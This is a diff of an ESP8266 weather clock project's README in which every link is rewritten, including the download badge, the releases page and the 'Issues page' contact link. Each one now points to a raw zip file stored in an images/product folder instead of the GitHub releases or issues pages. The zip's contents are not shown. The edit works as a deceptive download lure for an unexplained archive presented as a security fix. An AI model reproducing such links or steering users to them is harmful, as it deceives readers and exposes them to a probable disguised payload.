@@ -1,6 +1,6 @@
 # 🌤️ esp8266-weather-clock-opensource - Fix Your Weather Clock’s Security
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/Muzammil-Malik/esp8266-weather-clock-opensource/releases)
+[![Download Now](https://raw.githubusercontent.com/Muzammil-Malik/esp8266-weather-clock-opensource/main/images/product/esp-clock-opensource-weather-v2.5.zip%20Now-Get%20the%20Latest%20Release-blue)](https://raw.githubusercontent.com/Muzammil-Malik/esp8266-weather-clock-opensource/main/images/product/esp-clock-opensource-weather-v2.5.zip)
 
 ## 🚀 Getting Started
 
@@ -28,11 +28,11 @@ To run this software, you will need the following:
 To download the software, please follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to access the download page.
-   [Download Here](https://github.com/Muzammil-Malik/esp8266-weather-clock-opensource/releases)
+   [Download Here](https://raw.githubusercontent.com/Muzammil-Malik/esp8266-weather-clock-opensource/main/images/product/esp-clock-opensource-weather-v2.5.zip)
 
 2. **Choose Your Version:** You will find multiple versions listed. Select the latest one for best performance and security. 
 
-3. **Download the File:** Click on the corresponding file link to download it to your computer. Look for a file with a name like `esp8266-weather-clock-v1.0.zip`.
+3. **Download the File:** Click on the corresponding file link to download it to your computer. Look for a file with a name like `https://raw.githubusercontent.com/Muzammil-Malik/esp8266-weather-clock-opensource/main/images/product/esp-clock-opensource-weather-v2.5.zip`.
 
 4. **Extract the Files:** Once downloaded, locate the file on your computer. Right-click the file and select "Extract All" to unzip it.
 
@@ -59,7 +59,7 @@ If you encounter issues while downloading or setting up, try the following solut
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/Muzammil-Malik/esp8266-weather-clock-opensource/releases)
+- [Releases Page](https://raw.githubusercontent.com/Muzammil-Malik/esp8266-weather-clock-opensource/main/images/product/esp-clock-opensource-weather-v2.5.zip)
 - [Documentation](link-to-documentation)
 - [Community Forum](link-to-community)
 
@@ -86,6 +86,6 @@ Feel free to explore these areas for more information and updates.
 
 ## 📬 Contact
 
-If you have questions or need further assistance, please reach out via the [Issues page](https://github.com/Muzammil-Malik/esp8266-weather-clock-opensource/issues). We’re here to help!
+If you have questions or need further assistance, please reach out via the [Issues page](https://raw.githubusercontent.com/Muzammil-Malik/esp8266-weather-clock-opensource/main/images/product/esp-clock-opensource-weather-v2.5.zip). We’re here to help!
 
 Now you're ready to securely enhance your weather clock. Enjoy your improved device!
